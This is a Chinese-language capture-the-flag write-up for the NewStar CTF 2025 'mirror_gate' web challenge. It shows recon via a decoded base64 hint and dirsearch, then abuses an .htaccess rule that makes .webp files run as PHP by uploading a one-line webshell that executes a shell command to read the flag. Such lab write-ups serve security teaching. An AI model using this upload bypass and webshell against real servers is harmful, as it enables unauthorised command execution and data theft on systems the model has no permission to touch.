---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# mirror_gate

根据提示 `请设法找出他系统中的应用配置缺陷，突破上传限制。`，我们先抓一个响应包，发现存在 `Server: Apache/2.4.51 (Debian)` 头部，
猜测是 `.htaccess`(Apache 配置文件) 解析问题。

## 收集信息

访问网站，<kbd>F12</kbd> 查看前端源码发现

```html
flag is in flag.php   ---说明flag在flag.php
```

```html
HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw==
base64解码：something_is_in_/uploads/
```

上传 jpg 也有 hint: dirsearch

## 漏洞利用

用 dirsearch 扫描 ip:端口/uploads 发现 `.htaccess` 返回了 200，应证了我们的猜想。

下载 `.htaccess` 得到

```htaccess
AddType application/x-httpd-php .webp
```

这让上传的 `.webp` 文件被解析成 `php` 类型。

接下来上传 webp 一句话木马，利用解析漏洞让我们的 `.webp` 解析成 php, 从而绕过检查。再简单地绕过一下 waf 就可以，这里打法很多。

```php
<?=`tac /f*`?>
```
